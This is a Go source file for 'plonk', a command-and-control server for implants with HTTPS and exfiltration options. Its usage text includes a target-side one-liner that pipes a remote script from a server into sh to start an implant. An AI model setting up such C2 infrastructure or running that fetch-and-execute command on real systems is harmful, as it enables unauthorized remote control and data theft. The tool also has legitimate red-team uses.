// Program plonk - Really simple HTTP-based C2 server
package main

/*
 * plonk.go
 * Really simple HTTP-based C2 server
 * By J. Stuart McMurray
 * Created 20231104
 * Last Modified 20240117
 */

import (
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"os/user"
	"path/filepath"
	"sync"

	"github.com/magisterquis/plonk/internal/client"
	"github.com/magisterquis/plonk/internal/def"
	"github.com/magisterquis/plonk/internal/server"
	"github.com/magisterquis/plonk/internal/server/implantsvr"
	"github.com/magisterquis/plonk/internal/server/perms"
	"github.com/magisterquis/plonk/lib/humansize"
	"github.com/magisterquis/plonk/lib/plog"
	"golang.org/x/sys/unix"
)

/* Compile-time-settable defaults. */
var (
	DefaultDir       = "plonk.d" /* Just basename. */
	DefaultHTTPAddr  = ""
	DefaultHTTPSAddr = "0.0.0.0:443"
	DefaultName      = ""     /* Operator name. */
	DefaultMaxExfil  = "100M" /* Default max per-file exfil: 100MB. */
)

func main() {
	/* Command-line flags. */
	var (
		domainsL  sync.Mutex
		leDomains []string
		ssDomains []string
		exfilMax  = humansize.MustNew(DefaultMaxExfil)
	)
	var (
		dir = flag.String(
			"dir",
			defaultDir(),
			"Plonk's `directory`",
		)
		beServer = flag.Bool(
			"server",
			false,
			"Serve implants",
		)
		opName = flag.String(
			"name",
			defaultName(),
			"Operator `name`, for logging",
		)
		printImplantTemplate = flag.Bool(
			"print-template",
			false,
			"Print the implant template to stdout and exit",
		)
		httpAddr = flag.String(
			"http-address",
			DefaultHTTPAddr,
			"HTTP listen `address` (with -server)",
		)
		httpsAddr = flag.String(
			"https-address",
			DefaultHTTPSAddr,
			"HTTPS listen `address` (with -server)",
		)
		debug = flag.Bool(
			"debug",
			false,
			"Enable debug logging",
		)
		leStaging = flag.Bool(
			"letsencrypt-staging",
			false,
			"Use Let's Encrypt's staging server (with -server)",
		)
		leEmail = flag.String(
			"letsencrypt-email",
			"",
			"Optional email `address` to use with Let's Encrypt",
		)
	)
	flag.TextVar(
		&exfilMax,
		"exfil-max",
		&exfilMax,
		"Maximum per-file `size` for exfil, 0 to disable "+
			"(with -server)",
	)
	flag.Func(
		"selfsigned-domain",
		"TLS `domain` for which to serve a self-signed certificate "+
			"(with -server, may be repeated)",
		func(d string) error {
			domainsL.Lock()
			defer domainsL.Unlock()
			ssDomains = append(ssDomains, d)
			return nil
		},
	)
	flag.Func(
		"letsencrypt-domain",
		"Let's Encrypt-provisioned TLS `domain` (with -server, "+
			"may be repeated)",
		func(d string) error {
			domainsL.Lock()
			defer domainsL.Unlock()
			leDomains = append(leDomains, d)
			return nil
		},
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options]

Really simple HTTP-based C2 server.

If an HTTPS address is set (-https-address) but no domains are whitelisted
(-letsencrypt-domain and -selfsigned-domain), a self-signed certificate will be
used for all HTTPS requests.

In normal usage, one instance of this program is started as a persistent
server with -server, and then further instances of this program are started to
allow operators to connect to it.

Typical usage is something like:

# Start a server to handle comms from implants
nohup %s -server -letsencrypt-domain example.com >/dev/null 2>&1 &

# Start an implant going, on target
curl -sv https://example.com/c | sh

# Connect to the server
%s

Options:
`,
			os.Args[0],
			filepath.Base(os.Args[0]),
			filepath.Base(os.Args[0]),
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Excess command-line parameters mean a typo. */
	if 0 != flag.NArg() {
		log.Fatalf("Leftover command-line parameters found.  Typo?")
	}

	/* If we're just printing the template, life's easy. */
	if *printImplantTemplate {
		if _, err := io.WriteString(
			os.Stdout,
			implantsvr.RawTemplate,
		); nil != err {
			log.Fatalf("Error: %s", err)
		}
		return
	}

	/* If we're a client, be a client. */
	if !*beServer {
		/* But first make sure that we don't have any serverish
		flags. */
		var msg string
		switch {
		case DefaultHTTPAddr != *httpAddr:
			msg = "Can't listen for HTTP requests as a -client"
		case DefaultHTTPSAddr != *httpsAddr:
			msg = "Can't listen for HTTPS requests as a -client"
		case *leStaging ||
			"" != *leEmail ||
			0 != len(ssDomains) ||
			0 != len(leDomains):
			msg = "Can't serve HTTPS as a client"
		}
		if "" != msg {
			log.Fatalf("%s.  Need -server?", msg)
		}

		/* We look clientish, connect and go. */
		c := &client.Client{
			Dir:   *dir,
			Debug: *debug,
			Name:  *opName,
		}
		if err := c.Start(); nil != err {
			log.Fatalf("Error starting as client: %s", err)
		}
		if nil != c.Wait() {
			os.Exit(1)
		}
		return
	}

	/* If a server has a name, someone oopsed. */
	if defaultName() != *opName {
		log.Fatalf("Please don't give a -server a -name")
	}

	/* If we're serving HTTPS, make sure we can serve something. */
	if "" != *httpsAddr && 0 == len(leDomains) && 0 == len(ssDomains) {
		ssDomains = []string{"*"}
	}

	/* Start a server and wait for it to die. */
	perms.MustSetProcessPerms()
	svr := server.Server{
		Dir:               *dir,
		Debug:             *debug,
		HTTPAddr:          *httpAddr,
		HTTPSAddr:         *httpsAddr,
		LEDomainWhitelist: leDomains,
		LEStaging:         *leStaging,
		SSDomainWhitelist: ssDomains,
		LEEmail:           *leEmail,
		ExfilMax:          uint64(exfilMax),
	}
	if err := svr.Start(); nil != err {
		log.Fatalf("Error starting server: %s", err)
	}

	/* Kill the server nicely on Ctrl+C et al. */
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, unix.SIGINT, unix.SIGTERM)
	go func() {
		sig := <-ch
		signal.Stop(ch)
		svr.SL().Error(def.LMCaughtSignal, def.LKSignal, sig)
		svr.Stop(fmt.Errorf("caught signal %s", sig))
	}()

	/* Wait for the server to die. */
	err := svr.Wait()
	if nil == err {
		err = fmt.Errorf("mysterious circumstances")
	}
	plog.ErrorError(svr.SL(), def.LMServerDied, err)
}

// defaultDir returns Plonk's default directory.  It'll first try $HOME/plonk.d
// and failing that, use plonk.d in the current working directory.
func defaultDir() string {
	/* If it's in the environment, use it. */
	if d := os.Getenv(def.DirEnvVar); "" != d {
		return d
	}

	/* If someone changed the default to an absolute path, use that. */
	if filepath.IsAbs(DefaultDir) {
		return DefaultDir
	}

	/* If we can get the home directory, try that. */
	if hd, err := os.UserHomeDir(); nil == err {
		return filepath.Join(hd, DefaultDir)
	}

	/* Failing that, we'll use the current directory. */
	return DefaultDir
}

// defaultName tries to get the current user's name.  It tries def.DefaultName,
// the current GECOS name, the current username, and the current user ID, in
// that order.
func defaultName() string {
	/* If we have a default set, life's easy. */
	if "" != DefaultName {
		return DefaultName
	}

	/* If we can't get info about the current user, we'll have to go with
	a unix user ID number. */
	cu, err := user.Current()
	uids := fmt.Sprintf("uid%d", os.Getuid())
	if nil != err {
		return uids
	}

	/* Hopefully we have a username. */
	if "" != cu.Username {
		return cu.Username
	}

	/* Should at this point have a UID. */
	if "" != cu.Uid {
		return cu.Uid
	}

	/* Back to returning the Unix user ID number. */
	return uids
}
